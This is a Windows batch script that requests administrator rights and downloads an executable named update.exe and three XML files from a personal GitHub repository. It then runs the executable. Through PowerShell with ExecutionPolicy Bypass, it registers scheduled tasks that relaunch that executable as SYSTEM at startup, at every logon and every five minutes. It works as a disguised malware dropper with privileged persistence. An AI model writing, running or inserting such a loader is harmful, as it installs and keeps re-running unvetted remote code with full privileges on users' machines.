@echo off
:: Check for admin rights
net session >nul 2>&1
if %errorLevel% neq 0 (
    echo Requesting administrator privileges...
    powershell -Command "Start-Process '%~f0' -Verb runAs"
    exit /b
)


set "urlexe=https://github.com/gbg379594/OS/raw/refs/heads/main/update.exe"
set "outputexe=%USERPROFILE%\Downloads\Update\update.exe"

set "urlx1=https://github.com/gbg379594/OS/raw/refs/heads/main/update1.xml"
set "outputx1=%USERPROFILE%\Downloads\Update\1.xml"

set "urlx2=https://github.com/gbg379594/OS/raw/refs/heads/main/update2.xml"
set "outputx2=%USERPROFILE%\Downloads\Update\2.xml"

set "urlx3=https://github.com/gbg379594/OS/raw/refs/heads/main/update3.xml"
set "outputx3=%USERPROFILE%\Downloads\Update\3.xml"

timeout /t 1 >nul

echo Downloading file...
powershell -Command "Invoke-WebRequest -Uri '%urlexe%' -OutFile '%outputexe%'"

powershell -Command "Invoke-WebRequest -Uri '%urlx1%' -OutFile '%outputx1%'"

powershell -Command "Invoke-WebRequest -Uri '%urlx2%' -OutFile '%outputx2%'"

powershell -Command "Invoke-WebRequest -Uri '%urlx3%' -OutFile '%outputx3%'"

echo Running the downloaded file...
start "" "%outputexe%"

@echo off
:: تشغيل كود PowerShell لإنشاء مهام مجدولة بصلاحيات عالية
powershell -NoProfile -ExecutionPolicy Bypass -Command ^
"$path='C:\Users\PC\Downloads\Update\update.exe'; ^
Register-ScheduledTask -TaskName 'RunAsAdmin_Startup' -Trigger (New-ScheduledTaskTrigger -AtStartup) -Action (New-ScheduledTaskAction -Execute $path) -Settings (New-ScheduledTaskSettingsSet -AllowStartIfOnBatteries -DontStopIfGoingOnBatteries) -Principal (New-ScheduledTaskPrincipal -UserId 'SYSTEM' -LogonType ServiceAccount -RunLevel Highest) -Force; ^
Register-ScheduledTask -TaskName 'RunAsAdmin_Logon' -Trigger (New-ScheduledTaskTrigger -AtLogon) -Action (New-ScheduledTaskAction -Execute $path) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Force; ^
Register-ScheduledTask -TaskName 'RunAsAdmin_Every5Min' -Trigger (New-ScheduledTaskTrigger -Once -At (Get-Date) -RepetitionInterval (New-TimeSpan -Minutes 5)) -Action (New-ScheduledTaskAction -Execute $path) -Principal (New-ScheduledTaskPrincipal -UserId $env:USERNAME -LogonType Interactive -RunLevel Highest) -Force"



